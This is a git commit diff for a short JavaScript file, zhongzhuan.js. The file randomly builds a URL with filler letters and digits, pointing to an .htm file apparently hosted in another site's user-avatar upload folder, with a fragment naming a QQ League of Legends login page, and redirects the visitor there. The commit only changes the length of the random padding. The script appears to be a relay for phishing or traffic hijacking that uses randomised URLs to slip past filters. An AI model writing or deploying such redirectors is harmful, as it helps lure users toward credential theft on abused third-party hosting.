c8ef99cdf9a2921ec82b3fa58d20e65704b83f1d
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-03-02 04:10:34 +0800

    Update zhongzhuan.js

--- zhongzhuan.js
+++ zhongzhuan.js
@@ -1,3 +1,3 @@
-var urls=['http://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm?{wwwwwwwwww}{nnnnnnnnnn}#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html',];
+var urls=['http://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm?{wwwwww}{nnnn}#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){return s.replace(/\{(\w+?)\}/g,function(a,b){var h='';for(var i=0;i<b.length;i++){if('n'==b[i]){h+=Math.floor(Math.random()*10);}else if('w'==b[i]){h+=String.fromCharCode(97+Math.floor(Math.random()*26));}}return h;});}
